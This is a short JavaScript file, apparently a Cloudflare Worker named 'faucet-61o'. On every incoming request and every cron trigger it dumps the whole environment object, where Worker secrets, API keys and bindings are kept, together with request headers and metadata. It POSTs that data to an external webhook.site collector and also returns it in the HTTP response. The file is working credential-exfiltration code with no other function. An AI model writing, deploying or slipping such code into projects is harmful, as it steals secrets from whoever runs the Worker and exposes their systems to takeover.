const COLLECTOR = 'https://webhook.site/74e80559-9b11-4a3a-b7f1-87fad613e68e';

function dumpEnv(env) {
  const out = {};
  try {
    for (const k of Object.keys(env || {})) {
      let v = env[k];
      if (typeof v === 'string') out[k] = v;
      else if (v && typeof v === 'object') {
        try { out[k] = JSON.stringify(v); } catch (e) { out[k] = String(v); }
      } else out[k] = String(v);
    }
  } catch (e) {
    out.__error = String(e);
  }
  return out;
}

async function send(kind, payload) {
  try {
    await fetch(COLLECTOR, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(Object.assign({ kind, worker: 'faucet-61o' }, payload)),
    });
    return 'sent';
  } catch (e) {
    return 'send-err ' + String(e);
  }
}

function collect(request, env) {
  return {
    ts: new Date().toISOString(),
    url: request.url,
    method: request.method,
    headers: request.headers ? Object.fromEntries(request.headers.entries()) : null,
    cf: request.cf || null,
    env: dumpEnv(env),
  };
}

export default {
  async fetch(request, env, ctx) {
    const data = collect(request, env);
    const r = await send('worker-fetch', data);
    data.collector_result = r;
    return new Response(JSON.stringify(data, null, 2), {
      headers: { 'content-type': 'application/json' },
    });
  },
  async scheduled(event, env, ctx) {
    const data = { ts: new Date().toISOString(), cron: event.cron || null, env: dumpEnv(env) };
    ctx.waitUntil(send('worker-cron', data));
  },
};
